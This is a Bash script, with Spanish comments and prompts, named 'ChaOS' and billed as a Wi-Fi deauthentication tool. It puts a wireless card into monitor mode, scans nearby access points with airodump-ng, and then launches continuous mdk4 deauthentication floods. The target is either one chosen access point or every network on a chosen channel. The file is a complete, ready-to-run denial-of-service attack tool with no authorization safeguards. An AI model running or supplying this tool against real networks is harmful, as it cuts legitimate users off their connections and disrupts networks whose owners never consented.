#!/bin/bash

# Verificar si se ejecuta como root
if [ "$(id -u)" != "0" ]; then
    echo -e "\e[91mERROR: Debes ejecutar este script como root\e[0m"
    exit 1
fi

cleanup() {
    echo -e "\n\e[93mRealizando limpieza segura...\e[0m"
    # Detener procesos
    killall mdk4 > /dev/null 2>&1
    killall airodump-ng > /dev/null 2>&1
    
    # Solo restaurar si la interfaz se modifico
    if [ -n "$INTERFACE_MODIFIED" ] && [ "$INTERFACE_MODIFIED" = "true" ]; then
        echo -e "Restaurando interfaz \e[92m$ORIG_INTERFACE\e[0m a modo managed"
        ip link set $ORIG_INTERFACE down 2>/dev/null
        iw $ORIG_INTERFACE set type managed 2>/dev/null
        ip link set $ORIG_INTERFACE up 2>/dev/null
        
        # Reactivar NetworkManager
        if command -v nmcli &> /dev/null; then
            nmcli device set $ORIG_INTERFACE managed yes 2>/dev/null
        fi
    fi
    
    # Eliminar solo archivos temporales especificos
    rm -f /tmp/blacklist.txt /tmp/access_points.txt
    if [ -n "$SCAN_FILE" ] && [[ "$SCAN_FILE" == "/tmp/wifi_scan_"* ]]; then
        rm -f "$SCAN_FILE"*
    fi
    
    echo -e "\e[92mLimpieza completada de forma segura.\e[0m"
}

safe_exit() {
    cleanup
    exit 0
}

trap safe_exit INT EXIT

clear
echo "==============================================="
echo "                      ChaOS                    "
echo "        Herramienta de Deautenticacion Wifi    "
echo "==============================================="

# Obtener interfaces disponibles
INTERFACES=($(iw dev | awk '$1=="Interface"{print $2}'))
if [ ${#INTERFACES[@]} -eq 0 ]; then
    echo -e "\n\e[91mNo se encontraron interfaces inalambricas\e[0m"
    exit 1
fi

# Seleccionar interfaz
echo -e "\nInterfaces disponibles:"
for i in "${!INTERFACES[@]}"; do
    echo "$((i+1)). ${INTERFACES[$i]}"
done

read -p "Selecciona el numero de interfaz [1-${#INTERFACES[@]}]: " INT_CHOICE
if [[ ! "$INT_CHOICE" =~ ^[0-9]+$ ]] || ((INT_CHOICE < 1 || INT_CHOICE > ${#INTERFACES[@]})); then
    echo -e "\e[91mSeleccion invalida\e[0m"
    exit 1
fi

ORIG_INTERFACE="${INTERFACES[$((INT_CHOICE-1))]}"
echo -e "Interfaz seleccionada: \e[92m$ORIG_INTERFACE\e[0m"

# Variable para rastrear si modificamos la interfaz
INTERFACE_MODIFIED="false"

# Configurar modo monitor sin afectar NetworkManager
echo -e "\n\e[94mConfigurando modo monitor...\e[0m"

# Desactivar gestion de NetworkManager para esta interfaz
if command -v nmcli &> /dev/null; then
    if ! nmcli device set $ORIG_INTERFACE managed no; then
        echo -e "\e[91mError al deshabilitar NetworkManager para $ORIG_INTERFACE\e[0m"
        exit 1
    fi
fi

# Crear interfaz en modo monitor
ip link set $ORIG_INTERFACE down 2>/dev/null
if ! iw $ORIG_INTERFACE set type monitor 2>/dev/null; then
    echo -e "\e[91mError: No se pudo configurar el modo monitor en $ORIG_INTERFACE\e[0m"
    echo -e "\e[93mEsta interfaz probablemente no soporta modo monitor\e[0m"
    
    # Reactivar NetworkManager
    if command -v nmcli &> /dev/null; then
        nmcli device set $ORIG_INTERFACE managed yes 2>/dev/null
    fi
    exit 1
fi

ip link set $ORIG_INTERFACE up 2>/dev/null
MON_INTERFACE=$ORIG_INTERFACE
INTERFACE_MODIFIED="true"

if ! iw dev $MON_INTERFACE info | grep -q "type monitor"; then
    echo -e "\e[91mError: Verificacion de modo monitor fallo\e[0m"
    exit 1
fi

echo -e "Interfaz en modo monitor: \e[92m$MON_INTERFACE\e[0m"

# Crear archivo de escaneo con nombre seguro
SCAN_FILE="/tmp/wifi_scan_$(date +%s)"

# Escanear redes
echo -e "\n\e[94mEscaneando redes... (Presiona Ctrl+C para detener)\e[0m"
airodump-ng -w $SCAN_FILE --output-format csv $MON_INTERFACE &> /dev/null &
SCAN_PID=$!

# Espera de 10 segundos para capturar redes
sleep 10
kill -TERM $SCAN_PID 2>/dev/null
wait $SCAN_PID 2>/dev/null

# Se Procesan los resultados
SCAN_RESULT="${SCAN_FILE}-01.csv"
if [ ! -f "$SCAN_RESULT" ]; then
    echo -e "\n\e[91mError: No se genero el archivo de escaneo\e[0m"
    echo -e "\e[93mPosibles causas:"
    echo "1. No hay redes disponibles"
    echo "2. La interfaz no soporta escaneo"
    echo "3. Problema con airodump-ng\e[0m"
    exit 1
fi

# Filtrado Puntos de Acceso  validos
awk -F',' 'length($1) == 17 && $4 != "" && $14 != "" {print $1 "|" $4 "|" $14}' "$SCAN_RESULT" 2>/dev/null | sort | uniq > /tmp/access_points.txt
AP_COUNT=$(wc -l < /tmp/access_points.txt)

if [ "$AP_COUNT" -eq 0 ]; then
    echo -e "\n\e[91mNo se encontraron redes WiFi\e[0m"
    exit 1
fi

# Muestra del menu
echo -e "\n\e[95mAPs detectados ($AP_COUNT):\e[0m"
echo "-----------------------------------------------"
printf "%-4s %-18s %-8s %s\n" "ID" "BSSID" "Canal" "ESSID"
echo "-----------------------------------------------"
nl -n rz -w 2 -s '  ' /tmp/access_points.txt | awk -F'|' '{printf "%-4s %-18s %-8s %s\n", $1, $2, $3, $4}'
echo "-----------------------------------------------"

# Seleccion del objetivo
echo -e "\nOpciones de ataque:"
echo "1) Atacar AP especifico"
echo "2) Atacar todo un canal"
echo -e "3) \e[91mSalir\e[0m"

read -p "Selecciona una opcion [1-3]: " CHOICE

case $CHOICE in
    1)
        read -p "Ingresa el ID del AP a atacar: " AP_ID
        if [[ ! "$AP_ID" =~ ^[0-9]+$ ]] || ((AP_ID < 1 || AP_ID > AP_COUNT)); then
            echo -e "\e[91mID invalido\e[0m"
            exit 1
        fi
        
        LINE=$(sed -n "${AP_ID}p" /tmp/access_points.txt)
        BSSID=$(echo "$LINE" | cut -d'|' -f1)
        CHANNEL=$(echo "$LINE" | cut -d'|' -f2)
        ESSID=$(echo "$LINE" | cut -d'|' -f3)
        
        echo -e "\n\e[91mATACANDO: $ESSID (BSSID: $BSSID) en canal $CHANNEL\e[0m"
        iwconfig $MON_INTERFACE channel $CHANNEL
        echo "$BSSID" > /tmp/blacklist.txt
        mdk4 $MON_INTERFACE d -b /tmp/blacklist.txt 2> /dev/null &
        ;;
    2)
        read -p "Ingresa el numero de canal a atacar: " CHANNEL
        if [[ ! "$CHANNEL" =~ ^[0-9]+$ ]] || ((CHANNEL < 1 || CHANNEL > 14)); then
            echo -e "\e[91mCanal invalido (debe ser 1-14)\e[0m"
            exit 1
        fi
        
        echo -e "\n\e[91mATACANDO TODO EL CANAL $CHANNEL\e[0m"
        iwconfig $MON_INTERFACE channel $CHANNEL
        mdk4 $MON_INTERFACE d -c $CHANNEL 2> /dev/null &
        ;;
    3)
        echo "Saliendo..."
        exit 0
        ;;
    *)
        echo "Opción inválida"
        exit 1
        ;;
esac

# Monitor del ataque
echo -e "\n\e[93mATAQUE EN CURSO... (Presiona Ctrl+C para detener)\e[0m"
echo -e "\e[92mNetworkManager sigue activo. No se borrarán archivos del sistema.\e[0m"
while true; do
    sleep 1
done